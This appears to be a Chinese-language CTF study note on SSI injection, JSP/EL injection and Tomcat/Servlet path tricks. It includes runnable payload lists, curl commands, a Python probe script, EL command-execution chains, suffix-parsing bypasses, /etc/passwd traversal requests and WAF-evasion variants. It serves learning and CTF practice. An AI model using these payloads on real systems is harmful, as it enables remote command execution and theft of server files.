---
title: SSI / Servlet 冷门注入点（含 JSP/EL 注入）
category: web
tags: [ssi 注入, servlet, jsp el, tomcat, 冷门注入]
signals: [shtml 文件, ssi 指令, Apache SSI, tomcat 报错页, jsp 表达式, el 注入, servlet 路径, 上传 html 后被执行, <!--#exec cmd]
difficulty: medium
source: "HackTricks / PayloadsAllTheThings / 公开 writeup"
tools: [curl, burpsuite, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 上传/写入 `.shtml`、`.shtm`、`.stm` 文件后服务器端会**解析**（页面出现 `<!--#include virtual -->` 的结果）。
- Apache 开启 `mod_include` 与 `Options +Includes`。
- 应用返回的页面里有 `<!--#echo var="DATE_LOCAL" -->` 之类的 SSI 指令（模板直接输出）。
- JSP 报错页里回显了 EL 表达式求值结果（`${...}`）。
- 关键词：SSI、shtml、server-side include、EL 注入、JSP。

## 二、原理

**SSI 注入**：SSI（Server Side Includes）允许在 HTML 里嵌入服务器端指令：

```html
<!--#exec cmd="id" -->
<!--#include virtual="/etc/passwd" -->
```

若应用把用户输入写进 `.shtml` 页面（或用户可上传 .shtml），且 Web 服务器启用了 `Includes`，指令就会被执行。

**Servlet / JSP 冷门点**：
- Tomcat 对 `.jsp`、`.jspx`、`.jspf` 的解析差异；
- JSP EL 注入：`${''.getClass().forName('java.lang.Runtime')...}`；
- Servlet 路径参数（`/api/user/../../../etc/passwd`）；
- Tomcat 的 `shell.jsp;.jpg`、`shell.jsp%00.jpg`（旧版本）。

## 三、解题步骤

1. 找到能写 `.shtml` 文件的地方（上传、日志写文件、模板自定义）。
2. 写入 SSI 指令，访问看是否执行。
3. 若不行，换 JSP 后缀（`.jsp`、`.jspx`）。
4. EL 注入：找 `${}` 被求值的位置。
5. 读 flag。

## 四、可直接运行的脚本

SSI 注入 payload 集：

```html
<!--#exec cmd="id" -->
<!--#exec cmd="cat /flag" -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="/etc/passwd" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#printenv -->
<!--#config errmsg="SSI-OK" -->
```

写入后再访问：

```bash
# 1. 假设应用允许把输入写入 x.shtml
curl -s "http://TARGET/save" -d 'content=<!--#exec cmd="id">' -d 'name=x.shtml'
# 2. 访问
curl -s "http://TARGET/x.shtml"
```

Python 检测脚本：

```python
import requests

BASE = "http://TARGET"
probes = [
    '<!--#exec cmd="id"-->',
    '<!--#include virtual="/etc/passwd"-->',
    '<!--#echo var="DATE_LOCAL"-->',
]

def probe(payload, filename="t.shtml"):
    requests.post(BASE + "/save", data={"content": payload, "file": filename}, timeout=5)
    r = requests.get(BASE + "/uploads/" + filename, timeout=5)
    return r.status_code, r.text[:300]

for p in probes:
    print(probe(p))
```

JSP / EL 注入：

```text
# EL 表达式注入（Tomcat 8+ 需用 ProcessBuilder 链，Runtime.getRuntime 常被封）
${"".getClass().forName("java.lang.ProcessBuilder").getConstructor("".getClass()).newInstance("id".split(" ")).start()}

# 老版本 / 未封 Runtime 时
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}

# JSP 直接代码（需要 .jsp 后缀被执行）
<% new java.io.FileInputStream("/etc/passwd"); %>
```

Tomcat 后缀解析绕过（历史漏洞）：

```text
shell.jsp;.jpg         # Tomcat 路径参数（某些版本会解析 jsp）
shell.jsp%00.jpg       # 空字节截断（老版本）
shell.jsp/             # 目录穿越
```

Servlet 路径穿越：

```bash
curl "http://TARGET/static/../../../../etc/passwd"
curl "http://TARGET/servlet/Download?file=..%2F..%2F..%2Fetc%2Fpasswd"
```

WAF 场景下的 SSI 常见写法（大小写/注释）：

```html
<!--#exec cmd="id" -->
<!-- #exec cmd="id" -->
<!--#EXEC CMD="id" -->
<!--#exec cmd='id' -->
```

## 五、常见坑 / 变体

- **SSI 需要 `.shtml` 后缀被映射到 `INCLUDES`**：Apache 的 `httpd.conf` 里 `AddOutputFilter INCLUDES .shtml` + `Options +Includes`。
- **Nginx 的 SSI**：`ssi on;` + `ssi_types text/html`，`.shtml` 才会被处理，指令是 `<!--# echo var="..." -->`（Nginx 不支持 `exec`）。
- **文件名后缀不可控**：很多 CTF 题允许上传任意后缀，然后访问——典型 SSI 题就长这样。
- **`#exec cmd` 被禁用**：`AllowOverride` 里若禁 `IncludesNOEXEC`，只能用 `#include` 读文件。
- 变体：**JSP 的 `<%@ include file= %>`** 静态包含 + 上传文件。
- 变体：**Tomcat 的 `x.jsp` 被 404 但 `x.jsp/` 正常**（路径归一化）
- 变体：**Jolokia / Actuator 冷门端点**（见 `jolokia-realm.md`）。
- 变体：**`.htaccess` 的 `AddType text/html .shtml` + `AddOutputFilter INCLUDES .shtml`** 组合。

## 六、参考来源

- [Apache mod_include 官方文档](https://httpd.apache.org/docs/2.4/mod/mod_include.html)
- [Nginx ngx_http_ssi_module 文档](https://nginx.org/en/docs/http/ngx_http_ssi_module.html)
- [HackTricks - SSI Injection](https://book.hacktricks.wiki/en/pentesting-web/ssi-injection.html)
- [PayloadsAllTheThings - Server Side Include Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection)
- [OWASP - Testing for SSI Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_SSI_Injection)
